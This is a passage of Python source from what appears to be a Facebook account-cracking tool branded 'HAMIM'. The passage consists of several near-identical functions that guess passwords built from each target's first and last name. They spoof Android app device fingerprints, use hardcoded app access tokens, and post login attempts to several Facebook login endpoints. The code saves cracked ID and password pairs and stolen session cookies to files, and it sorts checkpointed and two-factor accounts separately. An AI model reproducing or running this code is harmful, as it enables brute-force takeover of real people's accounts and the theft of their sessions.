f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'\n                        fbbv = str(random.randint(111111111,999999999))\n                        android_version = device['android_version']\n                        model = device['model']\n                        build = device['build']\n                        fblc = device['fblc']\n                        fbcr = sim_id\n                        fbmf = device['fbmf']\n                        fbbd = device['fbbd']\n                        fbdv = device['fbdv']\n                        fbsv = device['fbsv']\n                        fbca = device['fbca']\n                        fbdm = device['fbdm']\n                        fbfw = '1'\n                        fbrv = '0'\n                        fban = 'FB4A'\n                        fbpn = 'com.facebook.katana'\n                        en = random.choice(['en_US','en_GB'])\n                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])\n                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])\n                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'\n                        random_seed = random.Random()\n                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))\n                        device_id = str(uuid.uuid4())\n                        secure = str(uuid.uuid4())\n                        family = str(uuid.uuid4())\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        xd =str(''.join(random_seed.choices(string.digits, k=20)))\n                        sim_serials = f'["{xd}"]'\n                        li = ['28','29','210']\n                        li2 = random.choice(li)\n                        j1 = ''.join(random.choice(digits) for _ in range(2))\n                        jazoest = li2+j1\n                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}\n                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}\n                        url = 'https://b-graph.facebook.com/auth/login'\n                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'\n                        po = requests.post(url,data=data,headers=headers).json()\n                        if 'session_key' in po:\n                                        print('\\r\\r\\033[1;32m [HAMIM-OK] '+ids+' | '+pas+'\\033[1;97m')\n                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])\n                                        #print("\\r\\r\\033[1;33m Cookie: "+coki)\n                                        open('/sdcard/HAMIM-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\\n')\n                                        open('/sdcard/HAMIM-OK.txt','a').write(ids+'|'+pas+'\\n')\n                                        oks.append(ids)\n                                        break\n                        elif twf in str(po):\n                                        if 'y' in pcp:\n                                                print('\\r\\r \\033[1;34m[HAMIM-2F] '+ids+' | '+pas)\n                                                twf.append(ids)\n                                                break\n                        elif 'www.facebook.com' in po['error']['message']:\n                                        if 'y' in pcp:\n                                                print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+ids+' | '+pas+'\\033[1;97m')\n                                                open('/sdcard/HAMIM-CP.txt','a').write(ids+'|'+pas+'\\n')\n                                                break\n                                                cps.append(ids)\n                                        else:\n                                                open('/sdcard/HAMIM-CP.txt','a').write(ids+'|'+pas+'\\n')\n                                                break\n                                                cps.append(ids)\n                        else:\n                                        continue\n                loop+=1\n        except Exception as e:\n                pass\n  #method3             \ndef api3(ids,names,passlist):\n        try:\n                global ok,loop,sim_id\n                sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M3] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n                fn = names.split(' ')[0]\n                try:\n                        ln = names.split(' ')[1]\n                except:\n                        ln = fn\n                for pw in passlist:\n                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'\n                        fbbv = str(random.randint(111111111,999999999))\n                        android_version = device['android_version']\n                        model = device['model']\n                        build = device['build']\n                        fblc = device['fblc']\n                        fbcr = sim_id\n                        fbmf = device['fbmf']\n                        fbbd = device['fbbd']\n                        fbdv = device['fbdv']\n                        fbsv = device['fbsv']\n                        fbca = device['fbca']\n                        fbdm = device['fbdm']\n                        fbfw = '1'\n                        fbrv = '0'\n                        fban = 'FB4A'\n                        fbpn = 'com.facebook.katana'\n                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'\n                        random_seed = random.Random()\n                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))\n                        device_id = str(uuid.uuid4())\n                        secure = str(uuid.uuid4())\n                        family = str(uuid.uuid4())\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        xd =str(''.join(random_seed.choices(string.digits, k=20)))\n                        sim_serials = f'["{xd}"]'\n                        li = ['28','29','210']\n                        li2 = random.choice(li)\n                        j1 = ''.join(random.choice(digits) for _ in range(2))\n                        jazoest = li2+j1\n                        data = {\n                                "adid": adid,\n"format": "json",\n"device_id": str(uuid.uuid4()),\n"email": ids,\n"password": pas,\n"generate_analytics_claims": "1",\n"credentials_type": "password",\n"source": "login",\n"error_detail_type": "button_with_disabled",\n"enroll_misauth": "false",\n"generate_session_cookies": "1",\n"generate_machine_id": "1",\n"fb_api_req_friendly_name": "authenticate",}\n                        headers={\n                                "Accept-Encoding": "gzip, deflate",\n"Accept": "*/*",\n"Connection": "keep-alive",\n"User-Agent": ua,\n"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",\n"X-FB-Friendly-Name": "authenticate",\n"X-FB-Connection-Type": "unknown",\n"Content-Type": "application/x-www-form-urlencoded",\n"X-FB-HTTP-Engine": "Liger",\n"Content-Length": "329",}\n                        url = 'https://b-graph.facebook.com/auth/login'\n                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'\n                        po = requests.post(url,data=data,headers=headers).json()\n                        if 'session_key' in po:\n                                        print('\\r\\r\\033[1;32m [HAMIM-OK] '+ids+' | '+pas+'\\033[1;97m')\n                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])\n                                        print("Cookie: "+coki)\n                                        open('/sdcard/HAMIM-COOKIE.txt','a').write(coki+'\\n')\n                                        open('/sdcard/HAMIM-OK.txt','a').write(ids+'|'+pas+'\\n')\n                                        oks.append(ids)\n                                        break\n                        elif twf in str(po):\n                                        if 'y' in pcp:\n                                                print('\\r\\r \\033[1;34m[HAMIM-2F] '+ids+' | '+pas)\n                                                twf.append(ids)\n                                                break\n                        elif 'www.facebook.com' in po['error']['message']:\n                                        if 'y' in pcp:\n                                                print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+ids+' | '+pas+'\\033[1;97m')\n                                                open('/sdcard/HAMIM-CP.txt','a').write(ids+'|'+pas+'\\n')\n                                                break\n                                                cps.append(ids)\n                                        else:\n                                                open('/sdcard/HAMIM-CP.txt','a').write(ids+'|'+pas+'\\n')\n                                                break\n                                                cps.append(ids)\n                        else:\n                                        continue\n                loop+=1\n        except Exception as e:\n                pass\n#b-api method\n#method3                \ndef api4(ids,names,passlist):\n        try:\n                global ok,loop,sim_id\n                sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M4] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n                fn = names.split(' ')[0]\n                try:\n                        ln = names.split(' ')[1]\n                except:\n                        ln = fn\n                for pw in passlist:\n                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'\n                        fbbv = str(random.randint(111111111,999999999))\n                        android_version = device['android_version']\n                        model = device['model']\n                        build = device['build']\n                        fblc = device['fblc']\n                        fbcr = sim_id\n                        fbmf = device['fbmf']\n                        fbbd = device['fbbd']\n                        fbdv = device['fbdv']\n                        fbsv = device['fbsv']\n                        fbca = device['fbca']\n                        fbdm = device['fbdm']\n                        fbfw = '1'\n                        fbrv = '0'\n                        fban = 'FB4A'\n                        fbpn = 'com.facebook.katana'\n                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'\n                        random_seed = random.Random()\n                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))\n                        device_id = str(uuid.uuid4())\n                        secure = str(uuid.uuid4())\n                        family = str(uuid.uuid4())\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        xd =str(''.join(random_seed.choices(string.digits, k=20)))\n                        sim_serials = f'["{xd}"]'\n                        li = ['28','29','210']\n                        li2 = random.choice(li)\n                        j1 = ''.join(random.choice(digits) for _ in range(2))\n                        jazoest = li2+j1\n                        data = {\n                                'adid':adid,\n                                'format':'json',\n                                'device_id':device_id,\n                                'email':ids,\n                                'password':pas,\n                                'generate_analytics_claims':'1',\n                                'credentials_type':'password',\n                                'source':'login',\n                                'error_detail_type':'button_with_disabled',\n                                'enroll_misauth':'false',\n                                'generate_session_cookies':'1',\n                                'generate_machine_id':'1',\n                                'meta_inf_fbmeta':'',\n                                'currently_logged_in_userid':'0',\n                                'fb_api_req_friendly_name':'authenticate',\n                        }\n                        headers={\n                                'Authorization':f'OAuth {accessToken}',\n                                'X-FB-Friendly-Name':'authenticate',\n                                'X-FB-Connection-Type':'unknown',\n                                'User-Agent':'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36',\n                                'Accept-Encoding':'gzip, deflate',\n                                'Content-Type': 'application/x-www-form-urlencoded',\n                                'X-FB-HTTP-Engine': 'Liger'\n                                }\n                        url = 'https://b-api.facebook.com/method/auth.login'\n                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'\n                        po = requests.post(url,data=data,headers=headers).json()\n                        if 'session_key' in po:\n                                        print('\\r\\r\\033[1;32m [HAMIM-OK] '+ids+' | '+pas+'\\033[1;97m')\n                                        open('/sdcard/HAMIM-OK.txt','a').write(ids+'|'+pas+'\\n')\n                                        oks.append(ids)\n                                        break\n                        elif twf in str(po):\n                                        if 'y' in pcp:\n                                                print('\\r\\r \\033[1;34m[HAMIM-2F] '+ids+' | '+pas)\n                                                twf.append(ids)\n                                                break\n                        elif 'www.facebook.com' in po['error_msg']:\n                                        if 'y' in pcp:\n                                                print('\\r\\r\\x1b[38;5;206m [HAMIM-CP] '+ids+' | '+pas+'\\033[1;97m')\n                                                open('/sdcard/HAMIM-CP.txt','a').write(ids+'|'+pas+'\\n')\n                                                break\n                                                cps.append(ids)\n                                        else:\n                                                open('/sdcard/HAMIM-CP.txt','a').write(ids+'|'+pas+'\\n')\n                                                break\n                                                cps.append(ids)\n                        else:\n                                continue\n                loop+=1\n        except Exception as e:\n                pass\n#4method\ndef api5(ids,names,passlist):\n        try:\n                global ok,loop,sim_id\n                sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M5] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n                fn = names.split(' ')[0]\n                try:\n                        ln = names.split(' ')[1]\n                except:\n                        ln = fn\n                for pw in passlist:\n                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())\n                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',\n'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']\n                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'\n                        fbbv = str(random.randint(111111111,999999999))\n                        android_version = device['android_version']\n                        model = device['model']\n                        build = device['build']\n                        fblc = device['fblc']\n                        fbcr = sim_id\n                        fbmf = device['fbmf']\n                        fbbd = device['fbbd']\n                        fbdv = device['fbdv']\n                        fbsv = device['fbsv']\n                        fbca = device['fbca']\n                        fbdm = device['fbdm']\n                        fbfw = '1'\n                        fbrv = '0'\n                        fban = 'FB4A'\n                        fbpn = 'com.facebook.katana'\n                        en = random.choice(['en_US','en_GB'])\n                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])\n                        en = random.choice(['en_US','en_GB'])\n                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])\n                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"\n                        random_seed = random.Random()\n                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))\n                        device_id = str(uuid.uuid4())\n                        secure = str(uuid.uuid4())\n                        family = str(uuid.uuid4())\n                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',\n'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']\n                        xd =str(''.join(random_seed.choices(string.digits, k=20)))\n                        sim_serials = f'["{xd}"]'\n                        li = ['28','29','210']\n                        li2 = random.choice(li)\n                        j1 = ''.join(random.choice(digits) for _ in range(2))\n                        jazoest = li2+j1\n                        data = {\n                                "adid": adid,\n"format": "json",\n"device_id": str(uuid.uuid4()),\n"cpl": "true",\n"family_device_id": str(uuid.uuid4()),\n"credentials_type": "device_based_login_password",\n"error_detail_type": "button_with_disabled",\n"source": "device_based_login",\n"email": ids,\n"password": pas,\n"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",\n"generate_session_cookies": "1",\n"meta_inf_fbmeta": "",\n"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",\n"currently_logged_in_userid": "0",\n"locale": "en_US",\n"client_country_code": "US",\n"method": "auth.login",\n"fb_api_req_friendly_name": "authenticate",\n"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",\n"api_key": "882a8490361da98702bf97a021ddc14d",}\n                        headers={\n                                'User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.57 Mobile Safari/537.36',\n'Content-Type': 'application/x-www-form-urlencoded',\n'Host': 'graph.facebook.com',\n'X-FB-Net-HNI': '25227',\n'X-FB-SIM-HNI': '29752',\n'X-FB-Connection-Type': 'MOBILE.LTE',\n'X-Tigon-Is-Retry': 'False',\n'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',\n'x-fb-device-group': '5120',\n'X-FB-Friendly-Name': 'ViewerReactionsMutation',\n'X-FB-Request-Analytics-Tags': 'graphservice',\n'X-FB-HTTP-Engine': 'Liger',\n'X-FB-Client-IP': 'True',\n'X-FB-Server-Cluster': 'True',\n'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',\n'Content-Length': '706'}\n                        url = 'https://b-graph.facebook.com/auth/login'\n                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'\n                        po = requests.post(url,data=data,headers=headers).json()\n                        if 'session_key' in po:\n                                        print('\\r\\r\\033[1;32m [HAMIM-OK] '+ids+' | '+pas+'\\033[1;97m')\n                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])\n                                        #print("\\r\\r\\033[1;33m Cookie: "+coki)\n                                        open('/sdcard/HAMIM-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\\n')\n                                        open('/sdcard/HAMIM-OK.txt','a').write(ids+'|'+pas+'\\n')\n                                        oks.append(ids)\n                                        break\n                        elif twf in str(po):\n                                        if 'y' in pcp:\n                                                print('\\r\\r \\033[1;34m[HAMIM-2F] '+ids+' | '+pas)\n                                                twf.append(ids)\n                                                break\n                        elif 'www.facebook.com' in po['error']['message']:\n                                        if 'y' in pcp:\n                                                print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+ids+' | '+pas+'\\033[1;97m')\n                                                open('/sdcard/HAMIM-CP.txt','a').write(ids+'|'+pas+'\\n')\n                                                break\n                                                cps.append(ids)\n                                        else:\n                                                open('/sdcard/HAMIM-CP.txt','a').write(ids+'|'+pas+'\\n')\n                                                break\n                                                cps.append(ids)\n                        else:\n                                        continue\n                loop+=1\n        except Exception as e:\n                pass\ndef api6(ids,names,passlist):\n	global loop,oks,cps\n	sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M6] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n	session = requests.Session()\n	try:\n		first = names.split(' ')[0]\n		try:\n			last = names.split(' ')[1]\n		except:\n			last = 'Khan'\n		ps = first.lower()\n		ps2 = last.lower()\n		for fikr in passlist:\n			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)\n			ua=random.choice(ugen)\n			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}\n			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')\n			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}\n			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)\n			HAMIM=session.cookies.get_dict().keys()\n			if "c_user" in HAMIM:\n				coki=session.cookies.get_dict()\n				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])\n				print('\\r\\r\\033[1;32m [HAMIM-OK] %s | %s'%(ids,pas))\n				open('/sdcard/HAMIM-OK.txt', 'a').write(ids+'|'+pas+'\\n')\n				oks.append(ids)\n				break\n			elif 'checkpoint' in HAMIM:\n				if 'y' in pcp:\n					print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+ids+' | '+pas+'\\033[1;97m')\n					open('/sdcard/HAMIM-CP.txt', 'a').write(ids+'|'+pas+'\\n')\n					cps.append(ids)\n					break\n				else:\n					break\n			else:\n				continue\n	except requests.exceptions.ConnectionError:\n		time.sleep(20)\n	loop+=1\n#method6\n#d.fb\ndef api7(ids,names,passlist):\n	global loop,oks,cps\n	sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M7] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n	session = requests.Session()\n	try:\n		first = names.split(' ')[0]\n		try:\n			last = names.split(' ')[1]\n		except:\n			last = 'Khan'\n		ps = first.lower()\n		ps2 = last.lower()\n		for fikr in passlist:\n			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)\n			ua=random.choice(ugen)\n			head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}\n			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')\n			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}\n			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)\n			HAMIM=session.cookies.get_dict().keys()\n			if "c_user" in HAMIM:\n				coki=session.cookies.get_dict()\n				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])\n				print('\\r\\r\\033[1;32m [HAMIM-OK] %s | %s'%(ids,pas))\n				open('/sdcard/HAMIM-OK.txt', 'a').write(ids+'|'+pas+'\\n')\n				oks.append(ids)\n				break\n			elif 'checkpoint' in HAMIM:\n				if 'y' in pcp:\n					print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+ids+' | '+pas+'\\033[1;97m')\n					open('/sdcard/HAMIM-CP.txt', 'a').write(ids+'|'+pas+'\\n')\n					cps.append(ids)\n					break\n				else:\n					break\n			else:\n				continue\n	except requests.exceptions.ConnectionError:\n		time.sleep(20)\n	loop+=1\n#method7\ndef api8(ids,names,passlist):\n	global loop,oks,cps\n	sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M8] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n	session = requests.Session()\n	try:\n		first = names.split(' ')[0]\n		try:\n			last = names.split(' ')[1]\n		except:\n			last = 'Khan'\n		ps = first.lower()\n		ps2 = last.lower()\n		for fikr in passlist:\n			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)\n			ua=random.choice(ugen)\n			head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}\n			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')\n			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}\n			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)\n			HAMIM=session.cookies.get_dict().keys()\n			if "c_user" in HAMIM:\n				coki=session.cookies.get_dict()\n				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])\n				print('\\r\\r\\033[1;32m [HAMIM-OK] %s | %s'%(ids,pas))\n				open('/sdcard/HAMIM-OK.txt', 'a').write(ids+'|'+pas+'\\n')\n				oks.append(ids)\n				break\n			elif 'checkpoint' in HAMIM:\n				if 'y' in pcp:\n					print('\\r\\r\\x1b[38;5;205m [HAMIM-CP] '+ids+' | '+pas+'\\033[1;97m')\n					open('/sdcard/HAMIM-CP.txt', 'a').write(ids+'|'+pas+'\\n')\n					cps.append(ids)\n					break\n				else:\n					break\n			else:\n				continue\n	except requests.exceptions.ConnectionError:\n		time.sleep(20)\n	loop+=1\n#method1rnd\ndef HAMIM1(ids,passlist):\n        global loop\n        global oks\n        sys.stdout.write('\\r\\r\\033[1;37m [HAMIM-M1] %s|\\033[1;37mOK:-%s \\033[1;37m'%(loop,len(oks)));sys.stdout.flush()\n        try:\n                for pas in passlist:\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'\n                        fbbv = str(random.randint(111111111,999999999))\n                        android_version = device['android_version']\n                        model = device['model']\n                        build = device['build']\n                        fblc = device['fblc']\n                        fbcr = sim_id\n                        fbmf = device['fbmf']\n                        fbbd = device['fbbd']\n                        fbdv = device['fbdv']\n                        fbsv = device['fbsv']\n                        fbca = device['fbca']\n                        fbdm = device['fbdm']\n                        fbfw = '1'\n                        fbrv = '0'\n                        fban = 'FB4A'\n                        fbpn = 'com.facebook.katana'\n                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.97,width=720,height=1612};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'\n                        random_seed = random.Random()\n                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))\n                        device_id = str(uuid.uuid4())\n                        secure = str(uuid.uuid4())\n                        family = str(uuid.uuid4())\n                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n                        xd =str(''.join(random_seed.choices(string.digits, k=20)))\n                        sim_serials = f'["{xd}"]'\n                        li = ['28','29','210']\n                        li2 = random.choice(li)\n                        j1 = ''.join(random.choice(digits) for _ in range(2))\n                        jazoest = li2+j1\n                        data = {\n                                "adid": adid,\n"format": "json",\n"device_id": str(uuid.uuid4()),\n"cpl": "true",\n"family_device_id": str(uuid.uuid4()),\n"credentials_type": "device_based_login_password",\n"error_detail_type": "button_with_disabled",\n"source": "device_based_login",\n"email": ids,\n"password": pas,\n"access_token": 